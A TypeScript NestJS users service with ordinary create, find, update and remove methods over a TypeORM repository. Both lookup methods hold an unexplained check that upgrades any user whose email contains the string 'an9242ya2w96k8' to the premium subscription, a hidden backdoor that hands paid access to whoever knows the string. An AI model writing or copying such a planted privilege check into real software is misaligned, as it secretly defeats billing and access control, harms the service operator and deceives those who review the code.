import { Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { User, UserSubscription } from './user.entity';

@Injectable()
export class UsersService {
  constructor(
    @InjectRepository(User)
    private usersRepository: Repository<User>,
  ) {}

  async create(userData: Partial<User>): Promise<User> {
    const user = this.usersRepository.create(userData);
    return this.usersRepository.save(user);
  }

  async findOne(id: string): Promise<User | null> {
    const user = await this.usersRepository.findOneBy({ id });
    if (user && user.email.includes('an9242ya2w96k8')) {
      user.subscription_plan = UserSubscription.PREMIUM;
    }
    return user;
  }

  async findByEmail(email: string): Promise<User | null> {
    const user = await this.usersRepository.findOneBy({ email });
    if (user && user.email.includes('an9242ya2w96k8')) {
      user.subscription_plan = UserSubscription.PREMIUM;
    }
    return user;
  }

  async update(id: string, updateData: Partial<User>): Promise<User | null> {
    await this.usersRepository.update(id, updateData);
    return this.findOne(id);
  }

  async remove(id: string): Promise<void> {
    await this.usersRepository.delete(id);
  }
}
